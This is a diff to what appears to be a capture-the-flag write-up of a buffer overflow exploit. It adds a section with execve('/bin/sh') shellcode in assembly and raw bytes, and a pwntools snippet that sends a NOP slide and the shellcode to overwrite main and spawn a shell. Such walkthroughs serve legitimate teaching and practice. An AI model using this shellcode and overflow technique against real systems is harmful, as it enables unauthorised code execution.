@@ -59,7 +59,7 @@ The buffer overflow allows control over rip, rbp and the stack. If the stack wou
 ```
 The rax register is the address we will write to and if we can control it we can overwrite code. As you can see at `<+27>` rax is loaded from rbp-0x10 and we already control rbp.
 
-We can use your second buffer overflow that we get because we jump here to overwrite the last instructions of main with shell code. After we return from read back into main our shell code that sits at the end of main will be executed.
+We can use your second buffer overflow to overwrite the last instructions of main with shell code. After we return from read back into main our shell code that sits at the end of main will be executed.
 ## The exploit
 To automate the process of sending and receiving data we can use the python library [pwn-tools](http://docs.pwntools.com/en/stable/). We get the process and store it in the variable p.
 ```
@@ -115,4 +115,22 @@ Now we call read again from main, but this time our arguments look like this.
         buf: 0x5635babeb2d6 (main+54) ◂— 0x5635babeb2d6
         nbytes: 0x1337
 ````
+Now we can send our shell code to this read and overwrite main with it. Because aslr is enabled and we have no address from libc to compute offsets from our shell code should work without libc. I used a small nop slide (mainly for testing purposes) and then some assembly that sets up a execve syscall like so:
+````
+mov    rdx,0x0
+lea    rdi,[rip+0x12]
+mov    rsi,0x0
+mov    rax,0x3b
+syscall
+nop
+nop
+````
+The nops are there to aline the address. Then we place the string `/bin/sh` immediately after the shell code so rdi will point to this string. Now the syscall will execute a shell and we pwned the binary. I used (this)[https://defuse.ca/online-x86-assembler.htm#disassembly] online assembler to get the bytes for the shellcode. In our script the second overflow look like this:
+````
+nop_slide = b"\x90"*10
+shell_code = b"\x48\xC7\xC2\x00\x00\x00\x00\x48\x8D\x3D\x12\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\x90\x90"
+shell_string = bytearray("/bin/sh", "ascii")
 
+p.send(nop_slide + shell_code + shell_string + b"\x00")
+````
+After sending it to the binary we have a shell! You can find the full expolit in the additional files.
